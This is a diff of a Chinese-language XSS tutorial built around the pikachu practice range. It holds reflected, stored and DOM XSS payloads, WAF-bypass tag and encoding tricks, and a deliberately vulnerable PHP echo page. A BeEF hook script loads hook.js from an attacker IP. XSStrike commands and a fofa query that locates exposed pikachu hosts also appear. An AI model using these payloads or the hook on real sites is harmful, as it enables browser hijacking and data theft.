@@ -2648,7 +2648,7 @@ php 自带函数（禁用）PHP: escapeshellarg - Manual
 
 
 二、反射型与存储型XSSXSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。
-1. 反射型1. 反射型流程
+1. 反射型1.1 反射型流程
 黑客诱导用户点击恶意URL：xxxxxxx.com/?xxx=&lt;script&gt;恶意代码&lt;/script&gt;
 客户端向URL对应的服务器发出请求
 服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
@@ -2656,26 +2656,22 @@ php 自带函数（禁用）PHP: escapeshellarg - Manual
 
 
 
-（2）案例
-编写代码
-
-把 php 文件放在 phpstudy 的 www 目录下
+1.2 案例1.2.1 编写代码把 php 文件放在 phpstudy 的 www 目录下
 &lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;
 
 访问
 ?x=1?x=&lt;script&gt;alert(1)&lt;/script&gt;?x=&lt;script&gt;alert(&#x27;已入侵你后端系统&#x27;)&lt;/script&gt;?x=&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
 
 
-fofa搜索命令
 
-&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;
+1.2.2 fofa搜索命令&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;
 
 
 
 
 
 进入 pikachu 靶场
-如果 fofa 访问失败，可以自己搭建pikachu靶场。
+如果 fofa 访问失败，可以自己搭建pikachu靶场**。**
 pikachu靶场：反射型XSS 练习
 
 反射型xss
@@ -2694,6 +2690,7 @@ pikachu靶场：反射型XSS 练习
 
 
 
+
 方法二：
 直接在输入框里输入恶意代码，但是我们发现会有长度限制：
 
@@ -2707,6 +2704,7 @@ F12，发现可以输入的最大长度是 20，那我们就可以把它的数�
 
 
 总结：输入框长度限制可通过修改URL或F12改前端代码绕过
+
 2. 存储型攻击数据存储在服务器，攻击持续生效，危害比反射型更大。
 以 pikachu 靶场为例：
 
@@ -2717,7 +2715,8 @@ F12，发现可以输入的最大长度是 20，那我们就可以把它的数�
 
 
 只要刷新这个页面，就会重复出现这句话。
-3. DOM型1. 流程
+
+3. DOM型3.1 流程
 黑客诱导用户点击恶意URL
 
 #&#x27; onclick=&quot;alert(1)&quot;
@@ -2742,7 +2741,8 @@ F12，发现可以输入的最大长度是 20，那我们就可以把它的数�
 点击之后：
 
 
-4. BeEF-XSS工具使用具体使用：beef-xss详细教程-CSDN博客
+
+三、BeEF-XSS工具使用具体使用：beef-xss详细教程-CSDN博客
 BeEF是Kali自带的XSS利用工具，基于Ruby开发。
 
 
@@ -2750,8 +2750,22 @@ BeEF是Kali自带的XSS利用工具，基于Ruby开发。
 Web UI：http://127.0.0.1:3000/ui/panel
 Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
 
-（2）攻击流程
+2. 攻击流程
+启动 BeEF
+
+beef-xss-start
+
+
+
+账号：beef** ，**我设置的密码是 kali
+
+
+
 黑客（Kali）IP 放入 Hook 代码中
+
+# 查看 IPifconfig
+
+
 
 &lt;script src=&quot;http://192.168.23.131:3000/hook.js&quot;&gt;&lt;/script&gt;
 
@@ -2761,16 +2775,16 @@ Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/s
 
 
 
-
-
 受害者访问页面被Hook，BeEF控制台可控制浏览器（如重定向）
 
 
-三、XSS的绕过技巧与修复1. 未开启WAF直接URL注入：
+
+
+四、XSS的绕过技巧与修复1. 未开启WAF直接URL注入：
 http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
 
-2. 开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
-3. 手工绕过1. 标签语法替换
+开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
+手工绕过标签语法替换
 audio标签
 
 &lt;audio src=x onerror=alert(47)&gt;&lt;audio src=x onerror=prompt(1);&gt;&lt;audio src=1 href=1 onerror=javascript:alert(1)&gt;
@@ -2785,10 +2799,10 @@ button标签
 
 &lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1)&gt;xss&lt;/button&gt;
 
-2. 加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
+加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
 
-4. XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
-1. 常用参数XSStrike
+XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
+常用参数XSStrike
 -h, --help显示帮助信息
 -u, --url指定目标 URL
 --dataPOST 方式提交内容
@@ -2812,12 +2826,11 @@ button标签
 --headers提供 HTTP 标头
 -d, --delay设置请求延迟
 
-2. 使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
+使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
 
-3. 优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
 
-
-四、总结Q1：XSS 是什么？跨站脚本攻击
+总结Q1：XSS 是什么？跨站脚本攻击
 Q2：XSS的产生原因是什么？后端开发没有对用户传入的参数做严格的限制或过滤，直接输出了用户传入的参数，导致用户传入的参数被浏览器当作 javascript 执行。
 Q3：XSS有什么危害？1、获取浏览器的其他信息
 2、窃取浏览器的敏感信息
